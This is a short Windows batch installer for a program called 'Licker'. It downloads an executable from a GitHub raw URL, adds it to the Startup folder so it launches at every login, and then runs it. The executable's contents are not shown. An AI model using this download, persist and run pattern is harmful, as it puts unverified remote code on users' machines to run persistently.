@echo off
title Lickers Setup
set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
set "SAVE_PATH=%USERPROFILE%\Licker.exe"
set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"

echo ------------------------------------------
echo   INSTALLING LICKERS...
echo ------------------------------------------

:: Download the EXE
curl -L "%EXE_URL%" -o "%SAVE_PATH%"

if exist "%SAVE_PATH%" (
    echo [OK] File downloaded successfully.
    
    :: Create the startup shortcut using PowerShell
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LINK%'); $s.TargetPath = '%SAVE_PATH%'; $s.Save()"
    
    echo [OK] Added to Windows Startup.
    echo ------------------------------------------
    echo DONE! Licker will run every time you start your PC.
    start "" "%SAVE_PATH%"
) else (
    echo [ERROR] Download failed. Check your internet connection.
)
pause
